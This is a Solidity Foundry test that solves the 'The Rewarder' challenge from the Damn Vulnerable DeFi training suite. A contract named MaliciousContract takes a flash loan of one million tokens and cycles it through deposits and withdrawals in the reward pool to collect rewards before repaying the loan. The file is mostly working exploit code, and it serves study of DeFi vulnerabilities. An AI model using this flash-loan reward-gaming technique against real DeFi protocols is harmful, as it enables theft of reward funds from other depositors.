// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import {TheRewarderPool} from "../src/damn-vulnerable-defi/contracts/the-rewarder/TheRewarderPool.sol";
import {FlashLoanerPool} from "../src/damn-vulnerable-defi/contracts/the-rewarder/FlashLoanerPool.sol";
import "forge-std/Test.sol";
import {DamnValuableToken} from "../src/damn-vulnerable-defi/contracts/DamnValuableToken.sol";

interface IERC20 {
    function balanceOf(address acc) external view virtual returns (uint256);
}

contract MaliciousContract is Test {
    DamnValuableToken token;
    TheRewarderPool pool;
    FlashLoanerPool flashPool;

    address rewardToken = 0x665B35028596b164a9A51B4b28Ed375Fc4E88945;
    address alice = vm.addr(1);

    function setUp() public {
        vm.startPrank(alice);

        token = new DamnValuableToken();
        pool = new TheRewarderPool(address(token));
        flashPool = new FlashLoanerPool(address(token));

        token.transfer(address(flashPool), 1_000_000e18);

        vm.stopPrank();
    }

    function testHack() public {
        skip(5 days);
        flashPool.flashLoan(1_000_000e18);
    }

    function receiveFlashLoan(uint256 amount) public {
        console.log(IERC20(rewardToken).balanceOf(address(this)));
        token.approve(address(pool), amount);

        pool.deposit(amount);
        pool.withdraw(amount);

        token.approve(address(pool), amount);

        pool.deposit(amount);
        pool.withdraw(amount);

        token.approve(address(pool), amount);

        pool.deposit(amount);
        pool.withdraw(amount);

        token.transfer(address(flashPool), amount);
        console.log(IERC20(rewardToken).balanceOf(address(this)));
    }
}
